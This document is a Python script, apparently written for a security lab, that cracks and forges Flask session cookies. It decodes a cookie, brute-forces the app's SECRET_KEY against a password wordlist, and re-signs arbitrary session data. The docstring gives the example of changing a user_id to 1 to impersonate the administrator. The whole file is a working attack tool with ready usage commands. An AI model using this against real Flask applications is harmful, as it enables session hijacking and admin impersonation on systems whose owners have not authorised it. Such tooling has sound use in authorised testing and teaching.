#!/usr/bin/env python3
"""Flask session cracker + forger — pure standard library, no installs.

For the authorized SIT lab (Atelier). Flask signs its session cookie with
itsdangerous: HMAC-SHA1, salt 'cookie-session', 'hmac' key derivation. This
reproduces that exactly, so it can (a) brute a wordlist to recover SECRET_KEY
and (b) re-sign an arbitrary payload once the key is known — e.g. flip
{"user_id": 15} to {"user_id": 1} to impersonate the admin.

No flask / itsdangerous / flask-unsign needed; only hashlib, hmac, zlib, base64.

  # decode a cookie (no key needed):
  python3 flask_session.py decode --cookie '<cookie>'

  # crack the key against rockyou:
  python3 flask_session.py crack --cookie '<cookie>' --wordlist /usr/share/wordlists/rockyou.txt

  # forge a new cookie once cracked:
  python3 flask_session.py forge --secret '<key>' --data '{"user_id": 1}'
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import struct
import sys
import time
import zlib


def b64d(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_payload(cookie: str):
    """Return the JSON payload dict from a cookie (signature not checked)."""
    part = cookie.split(".")[0]
    raw = b64d(part)
    if raw[:1] == b".":          # Flask marks zlib-compressed payloads with a leading '.'
        raw = zlib.decompress(raw[1:])
    return json.loads(raw)


def derive_key(secret: bytes) -> bytes:
    # itsdangerous key_derivation='hmac', digest=sha1, salt='cookie-session'
    return hmac.new(secret, b"cookie-session", hashlib.sha1).digest()


def good(cookie: str, secret: bytes) -> bool:
    try:
        signed, sig_b64 = cookie.rsplit(".", 1)
    except ValueError:
        return False
    want = hmac.new(derive_key(secret), signed.encode(), hashlib.sha1).digest()
    try:
        got = b64d(sig_b64)
    except Exception:
        return False
    return hmac.compare_digest(want, got)


def forge(secret: bytes, data: dict) -> str:
    # session dicts are tiny and never benefit from compression, so emit plain
    # JSON — matches what Flask produces for these payloads (validated).
    body = json.dumps(data, separators=(",", ":"), sort_keys=True).encode()
    p_b64 = b64e(body)
    ts = b64e(int_to_bytes(int(time.time())))
    signed = f"{p_b64}.{ts}"
    sig = b64e(hmac.new(derive_key(secret), signed.encode(), hashlib.sha1).digest())
    return f"{signed}.{sig}"


def int_to_bytes(n: int) -> bytes:
    if n == 0:
        return b""
    return n.to_bytes((n.bit_length() + 7) // 8, "big")


def cmd_decode(a):
    print(json.dumps(decode_payload(a.cookie), indent=2))


def cmd_crack(a):
    with open(a.wordlist, "rb") as fh:
        for i, line in enumerate(fh, 1):
            key = line.rstrip(b"\r\n")
            if not key:
                continue
            if good(a.cookie, key):
                print(f"\n[+] SECRET_KEY = {key.decode('latin-1')!r}  (line {i})")
                return
            if i % 200000 == 0:
                print(f"  ...{i} tried", file=sys.stderr)
    print("\n[-] not found in wordlist", file=sys.stderr)
    sys.exit(1)


def cmd_forge(a):
    data = json.loads(a.data)
    print(forge(a.secret.encode(), data))


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("decode"); d.add_argument("--cookie", required=True); d.set_defaults(fn=cmd_decode)
    c = sub.add_parser("crack")
    c.add_argument("--cookie", required=True); c.add_argument("--wordlist", required=True)
    c.set_defaults(fn=cmd_crack)
    f = sub.add_parser("forge")
    f.add_argument("--secret", required=True); f.add_argument("--data", required=True)
    f.set_defaults(fn=cmd_forge)

    a = ap.parse_args()
    a.fn(a)


if __name__ == "__main__":
    main()
